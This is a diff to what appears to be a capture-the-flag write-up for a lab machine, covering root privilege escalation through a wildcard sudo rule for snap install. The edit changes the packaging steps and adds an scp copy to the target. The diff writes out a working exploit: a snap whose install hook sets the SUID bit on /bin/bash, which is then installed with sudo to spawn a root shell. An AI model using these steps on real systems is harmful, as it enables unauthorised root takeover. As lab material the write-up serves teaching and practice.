@@ -92,6 +92,8 @@ User brucetherealadmin may run the following commands on armageddon:
 
 The wildcard allows installing an arbitrary snap. A snap is a squashfs image with metadata and hooks; the `install` hook runs as root during installation:
 
+The target is CentOS 7 with no `snapcraft`, no `fpm` and no Internet access: build the package **on the attacker box** and copy it over.
+
 ```bash
 mkdir -p /tmp/pwn/meta/hooks
 cat > /tmp/pwn/meta/snap.yaml <<'EOF'
@@ -108,11 +110,12 @@ cat > /tmp/pwn/meta/hooks/install <<'EOF'
 chmod +s /bin/bash
 EOF
 chmod +x /tmp/pwn/meta/hooks/install
-cd /tmp && mksquashfs pwn pwn.snap -noappend
+snapcraft pack /tmp/pwn     # or: mksquashfs /tmp/pwn /tmp/pwn_1.0_amd64.snap -noappend
 ```
 
 ```bash
-sudo snap install /tmp/pwn.snap --dangerous --devmode
+scp /tmp/pwn_1.0_amd64.snap brucetherealadmin@<IP>:/tmp/
+sudo snap install /tmp/pwn_1.0_amd64.snap --dangerous --devmode
 /bin/bash -p
 ```
 
